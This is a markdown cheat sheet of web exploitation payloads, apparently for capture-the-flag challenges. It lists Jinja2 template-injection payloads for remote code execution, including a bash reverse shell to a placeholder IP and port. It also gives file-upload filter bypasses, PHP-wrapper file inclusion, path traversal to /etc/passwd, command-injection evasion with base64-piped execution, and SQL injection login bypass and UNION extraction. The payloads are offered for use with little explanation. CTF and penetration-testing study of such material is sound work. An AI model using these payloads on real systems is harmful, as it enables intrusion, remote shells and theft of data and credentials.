# Web Exploitation Payloads

## 1. Server-Side Template Injection (SSTI)

### Identification
Submit test expressions into input fields:
- `{{7*7}}`: Returns `49` (Flask/Jinja2 or Twig).
- `${7*7}`: Returns `49` (Java/Spring, Smarty, or PHP).
- `{{7*'7'}}`: Returns `7777777` in Jinja2; returns `49` in Twig.

### Jinja2 (Flask / Python) Remote Code Execution
Read system files:
```jinja2
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

Spawn a reverse shell:
```jinja2
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c "bash -i >& /dev/tcp/<IP>/<PORT> 0>&1"').read() }}
```

Filter bypass when quotes or standard keywords are blocked:
```jinja2
{{ request.application.__globals__.__builtins__.__import__('os').popen(request.args.cmd).read() }}&cmd=cat+/flag*
```

---

## 2. File Upload Bypasses

When `.php` is blocked:

1. Alternative extensions:
   `.phtml`, `.php3`, `.php4`, `.php5`, `.php7`, `.phps`, `.phar`

2. Double extensions and null bytes:
   `shell.php.jpg`, `shell.php%00.jpg`, `shell.php.png`

3. Magic bytes and MIME type spoofing:
   Prepend GIF header bytes to your upload file to bypass file header validation:
   ```text
   GIF89a;
   [Insert PHP command execution code here, e.g. phpinfo() or system command]
   ```
   In Burp Suite, change `Content-Type: application/x-php` to `Content-Type: image/png` or `image/jpeg`.

---

## 3. Local File Inclusion (LFI) and PHP Wrappers

### Read Source Code (Base64 Filter)
```text
http://<IP>/index.php?page=php://filter/convert.base64-encode/resource=index.php
http://<IP>/index.php?page=php://filter/convert.base64-encode/resource=config.php
```
Decode the output using:
```bash
echo "<BASE64_STRING>" | base64 -d
```

### Path Traversal Patterns
```text
../../../../etc/passwd
..%2f..%2f..%2f..%2fetc%2fpasswd
....//....//....//etc/passwd
/etc/passwd%00
```

---

## 4. Command Injection Bypasses

### Space Replacement
Use environment variables or file redirection when spaces are blocked:
```bash
cat$IFS/flag.txt
cat${IFS}/flag.txt
cat<$IFS/flag.txt
{cat,/flag.txt}
```

### Keyword Obfuscation
Concatenate empty strings or quotes:
```bash
c''at /fl*
c""at /fl?g
c\at /f'l'ag.txt
```

Execute base64-encoded command:
```bash
echo "Y2F0IC9mbGFn" | base64 -d | sh
```

---

## 5. SQL Injection (SQLi)

### Authentication Bypass
```sql
admin'--
admin' #
admin' or 1=1--
' OR 1=1 LIMIT 1--
' OR 1=1 --
```

### UNION-Based Data Extraction
Determine column count and extract tables:
```sql
' UNION SELECT null, null, null--
' UNION SELECT null, sqlite_version(), null--
' UNION SELECT null, sql, null FROM sqlite_master WHERE type='table'--
' UNION SELECT null, flag, null FROM flag--
```
